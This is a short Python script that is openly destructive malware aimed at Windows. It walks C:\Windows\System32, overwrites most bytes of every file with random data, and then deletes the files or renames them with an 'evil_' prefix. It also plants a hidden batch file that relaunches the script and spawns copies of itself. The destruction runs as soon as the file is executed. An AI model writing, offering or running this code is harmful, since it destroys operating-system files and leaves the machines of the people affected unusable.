import os
import random
import shutil
import subprocess

def destruction():
    target_directory = "C:\\Windows\\System32"

    files = [os.path.join(root, filename)
             for root, _, filenames in os.walk(target_directory)
             for filename in filenames]

    for file in files:
        corrupt_file(file)
        delete_file(file)

    create_autorun_loop()

def corrupt_file(file):
    with open(file, "rb+") as f:
        contents = f.read()
        modified_contents = bytearray()

        for byte in contents:
            if random.random() < 0.7:
                modified_byte = random.randint(0, 255)
                modified_contents.append(modified_byte)
            else:
                modified_contents.append(byte)

        f.seek(0)
        f.write(modified_contents)
        f.truncate()

def delete_file(file):
    if random.random() < 0.5:
        os.remove(file)
    else:
        destination = os.path.join(os.path.dirname(file), f"evil_{os.path.basename(file)}")
        shutil.move(file, destination)

def create_autorun_loop():
    autorun_path = os.path.join("C:\\Windows\\System32", "autorun.bat")

    if not os.path.exists(autorun_path):
        autorun_contents = """@echo off
start /B pythonw.exe test.py
start autorun.bat
"""

        with open(autorun_path, "w") as autorun_file:
            autorun_file.write(autorun_contents)

        subprocess.call(["attrib", "+H", autorun_path])  # Make the file hidden

destruction()